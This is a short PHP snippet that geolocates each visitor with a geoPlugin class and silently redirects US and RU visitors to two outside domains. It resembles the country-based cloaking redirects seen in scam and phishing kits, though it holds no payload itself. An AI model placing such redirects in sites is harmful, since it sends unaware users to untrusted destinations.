require_once('geoplugin.class.php');
$geoplugin = new geoPlugin();
$geoplugin->locate();

$var_country_code = $geoplugin->countryCode;

if ($var_country_code == "US" OR $var_country_code == "UM") {
header('Location: https://lushapps.cf/');
}
elseif($var_country_code == "RU") {
header('Location: http://www.getacho.com/ru/index.html');
}